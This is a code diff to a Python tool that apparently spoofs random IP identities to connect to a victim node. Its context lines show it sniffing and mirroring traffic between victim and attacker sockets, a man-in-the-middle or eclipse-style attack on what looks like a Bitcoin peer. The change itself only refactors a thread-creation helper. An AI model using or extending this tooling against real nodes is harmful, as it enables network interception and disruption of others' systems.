@@ -196,7 +196,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		close_connection(s, None, src_ip, src_port, interface)
 		time.sleep(1)
 		rand_ip = random_ip()
-		create_task('Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
+		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 		return
 
 	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
@@ -207,7 +207,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		close_connection(s, None, src_ip, src_port, interface)
 		time.sleep(1)
 		rand_ip = random_ip()
-		create_task('Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
+		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 		return
 
 	try:
@@ -225,7 +225,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		print('Failed to send packets to victim')
 		close_connection(s, None, src_ip, src_port, interface)
 		rand_ip = random_ip()
-		create_task('Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
+		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 
 	if verbose: print('Connection successful!')
 
@@ -239,11 +239,11 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 
 	# Listen to the connections for future packets
 	if verbose: print(f'Attaching packet listener to {interface}')
-	create_task('Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
+	create_task(True, 'Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
 
 	if mirror_socket != None:
 		if verbose: print(f'Attaching mirror packet listener to {interface}')
-		create_task('Mirror identity ' + src_ip, mirror_sniff, mirror_socket, s, src_ip, src_port, dst_ip, dst_port, interface)
+		create_task(True, 'Mirror identity ' + src_ip, mirror_sniff, mirror_socket, s, src_ip, src_port, dst_ip, dst_port, interface)
 
 # Reconnect a peer
 def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
@@ -286,7 +286,7 @@ def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, inte
 	identity_socket.append(s)
 	identity_address.append((src_ip, src_port))
 	identity_interface.append(interface)
-	create_task('Reconnected ' + src_ip, sniff_func, s, other_socket, src_ip, src_port, dst_ip, dst_port, interface)
+	create_task(True, 'Reconnected ' + src_ip, sniff_func, s, other_socket, src_ip, src_port, dst_ip, dst_port, interface)
 
 	print(f'Successfully reconnected ({dst_ip} : {dst_port})')
 
@@ -335,7 +335,7 @@ def sniff(thread, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, int
 	while not thread.stopped():
 		try:
 			packet = socket.recv(65565)
-			create_task('Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff)
+			create_task(True, 'Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff)
 		except: time.sleep(1)
 	close_connection(socket, None, dst_ip, dst_port, interface)
 	#close_connection(mirror_socket, socket, src_ip, src_port, interface)
@@ -344,7 +344,7 @@ def mirror_sniff(thread, socket, orig_socket, src_ip, src_port, dst_ip, dst_port
 	while not thread.stopped():
 		try:
 			packet = socket.recv(65565)
-			create_task('Process mirror packet ' + src_ip, mirror_packet_received, thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, mirror_sniff)
+			create_task(True, 'Process mirror packet ' + src_ip, mirror_packet_received, thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, mirror_sniff)
 		except: time.sleep(1)
 	close_connection(socket, None, src_ip, src_port, interface)
 	#close_connection(orig_socket, socket, dst_ip, dst_port, interface)
@@ -395,7 +395,7 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip
 			socket.sendall(pong.to_bytes())
 		except Exception as e:
 			print(f'Lost connection to ({victim_ip} : {victim_port})')
-			create_task('Reconnecting ' + victim_ip, reconnect, socket, mirror_socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
+			create_task(False, 'Reconnecting ' + victim_ip, reconnect, socket, mirror_socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
 	elif msg_type == 'version': pass # Ignore version
 	elif msg_type == 'verack': pass # Ignore verack
 	else:
@@ -405,7 +405,7 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip
 		except Exception as e:
 			parent_thread.stop()
 			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
-			create_task('Reconnecting ' + attacker_ip, reconnect, mirror_socket, socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
+			create_task(False, 'Reconnecting ' + attacker_ip, reconnect, mirror_socket, socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
 
 
 		#close_connection(socket, mirror_socket, from_ip, from_port, interface)
@@ -469,7 +469,7 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 			socket.sendall(pong.to_bytes())
 		except Exception as e:
 			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
-			create_task('Reconnecting ' + attacker_ip, reconnect, socket, orig_socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
+			create_task(False, 'Reconnecting ' + attacker_ip, reconnect, socket, orig_socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
 	else:
 		if orig_socket == None: return False # If the destination socket isn't running, ignore packet
 		try:
@@ -477,7 +477,7 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 		except Exception as e:
 			parent_thread.stop()
 			print(f'Lost connection to ({victim_ip} : {victim_port})')
-			create_task('Reconnecting ' + victim_ip, reconnect, orig_socket, socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
+			create_task(False, 'Reconnecting ' + victim_ip, reconnect, orig_socket, socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
 
 		# print("Closing socket because of error: " + str(e))
 		# parent_thread.stop()
@@ -545,7 +545,7 @@ def cleanup_ipaliases():
 
 # Run a fuction in parallel to other code
 class Task(threading.Thread):
-	def __init__(self, name, function, *args):
+	def __init__(self, sendThreadAsFirstArg, name, function, *args):
 		assert isinstance(name, str), 'Argument "name" is not a string'
 		assert callable(function), 'Argument "function" is not callable'
 		threading.Thread.__init__(self)
@@ -554,12 +554,15 @@ class Task(threading.Thread):
 		self.setName(name)
 		self.function = function
 		self.args = args
+		self.send_thread = sendThreadAsFirstArg
 
 	def __str__(self):
 		return f'Task({self.name})'
 
 	def run(self):
-		self.function(*self.args)
+		if self.send_thread: self.function(self, *self.args)
+		else: self.function(*self.args)
+		
 		self._stop_event.set()
 
 	def stop(self):
@@ -569,8 +572,8 @@ class Task(threading.Thread):
 		return self._stop_event.is_set()
 
 # Creates a new thread and starts it
-def create_task(name, function, *args):
-	task = Task(name, function, *args)
+def create_task(sendThreadAsFirstArg, name, function, *args):
+	task = Task(sendThreadAsFirstArg, name, function, *args)
 	threads.append(task)
 	task.start()
 	return task
